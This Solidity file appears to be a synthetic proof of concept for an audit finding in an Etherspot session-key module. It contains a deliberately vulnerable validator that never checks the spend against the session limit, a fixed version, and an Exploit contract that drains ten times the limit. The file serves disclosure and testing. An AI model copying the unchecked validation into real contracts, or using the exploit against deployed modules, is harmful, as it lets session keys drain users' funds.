// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Etherspot CredibleAccountModule — validateSessionKeyParams does not
    enforce the session limit (Shieldify, finding #61407 / C-05, July 2025).

    SYNTHETIC, cheatcode-free. The function is public and _validateSingleCall
    never compares the call amount to the session limit. A session whose
    limit is 100 GLUE spends N = 1000 GLUE. The fixed module reverts
    SessionParamsRejected on the same params. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Wallet {
    function approve(Token token, address module, uint256 amount) external {
        token.approve(module, amount);
    }
}

struct PackedUserOperation {
    address sender;
    uint256 amount;
    bytes signature;
}

contract CredibleAccountModule {
    Token public token;
    mapping(address => bool) public isSessionClaimed;
    mapping(address => address) public sessionWallet;
    mapping(address => uint256) public sessionLimit;
    mapping(address => uint256) public sessionSpent;

    constructor(Token token_) {
        token = token_;
    }

    function enableSession(address sessionKey, address wallet, uint256 limit) external {
        sessionWallet[sessionKey] = wallet;
        sessionLimit[sessionKey] = limit;
    }

    function validateSessionKeyParams(address _sessionKey, PackedUserOperation calldata userOp) public returns (bool) {
        if (isSessionClaimed[_sessionKey]) return false;
        return _validateSingleCall(_sessionKey, userOp.sender, userOp.amount);
    }

    function _validateSingleCall(address sessionKey, address sender, uint256 amount) internal returns (bool) {
        require(sessionWallet[sessionKey] == sender, "wallet");
        // @> VULN: amount is not checked against sessionLimit, so the key spends past it
        token.transferFrom(sender, msg.sender, amount);
        sessionSpent[sessionKey] = amount;
        isSessionClaimed[sessionKey] = true;
        return true;
    }
}

contract CredibleAccountModuleFixed {
    Token public token;
    mapping(address => address) public sessionWallet;
    mapping(address => uint256) public sessionLimit;

    error SessionParamsRejected();

    constructor(Token token_) {
        token = token_;
    }

    function enableSession(address sessionKey, address wallet, uint256 limit) external {
        sessionWallet[sessionKey] = wallet;
        sessionLimit[sessionKey] = limit;
    }

    function validateSessionKeyParams(address _sessionKey, PackedUserOperation calldata userOp) public returns (bool) {
        return _validateSingleCall(_sessionKey, userOp.sender, userOp.amount);
    }

    function _validateSingleCall(address sessionKey, address sender, uint256 amount) internal returns (bool) {
        require(sessionWallet[sessionKey] == sender, "wallet");
        if (amount > sessionLimit[sessionKey]) revert SessionParamsRejected();
        token.transferFrom(sender, msg.sender, amount);
        return true;
    }
}

contract Exploit {
    uint256 public constant LIMIT = 100 ether;
    uint256 public constant N = 1000 ether;

    Token public token;
    Wallet public wallet;
    CredibleAccountModule public module;
    address public sessionKey;

    constructor() {
        token = new Token("Glue", "GLUE", 18);
        wallet = new Wallet();
        module = new CredibleAccountModule(token);
        sessionKey = address(this);
    }

    function run() external {
        token.mint(address(wallet), N);
        wallet.approve(token, address(module), N);
        module.enableSession(sessionKey, address(wallet), LIMIT);
        PackedUserOperation memory op = PackedUserOperation({sender: address(wallet), amount: N, signature: hex"01"});
        bool ok = module.validateSessionKeyParams(sessionKey, op);
        require(ok, "validation failed");
        require(N > LIMIT, "spend is not over the limit");
        require(module.sessionSpent(sessionKey) == N, "spent is not N");
        require(token.balanceOf(address(this)) == N, "key did not receive N");
        require(token.balanceOf(address(wallet)) == 0, "wallet still holds N");
    }
}
